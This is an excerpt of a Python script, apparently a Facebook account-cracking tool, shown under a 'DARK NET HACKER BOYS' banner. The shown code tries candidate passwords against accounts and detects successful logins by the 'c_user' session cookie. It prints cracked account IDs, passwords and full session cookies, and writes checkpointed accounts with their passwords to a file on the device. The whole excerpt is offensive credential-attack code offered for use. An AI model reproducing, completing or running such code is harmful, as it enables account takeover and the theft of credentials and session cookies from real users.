...
|  _ \      | \ | |     | | | |     | __ ) / _ \ \ / / ___|  
| | | |_____|  \| |_____| |_| |_____|  _ \| | | \ V /\___ \  
| |_| |_____| |\  |_____|  _  |_____| |_) | |_| || |  ___) | 
|____/      |_| \_|     |_| |_|     |____/ \___/ |_| |____/  
                                                             

                                                                                                                                            
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mMADE BY     : ASRAF-MAHDI
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB                 : ASRAF MAHDI
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB PAGE      : DARK NET HACKER BOYS
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mVERSION     : 2.0
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \33[1;30m(D-N-H-BOYS-OK 💚)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('   \033[1;32m(D-N-H-BOYS-CP 💔)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/D-N-H-BOYS-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r %s[ D-N-H-BOYS-XD ] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
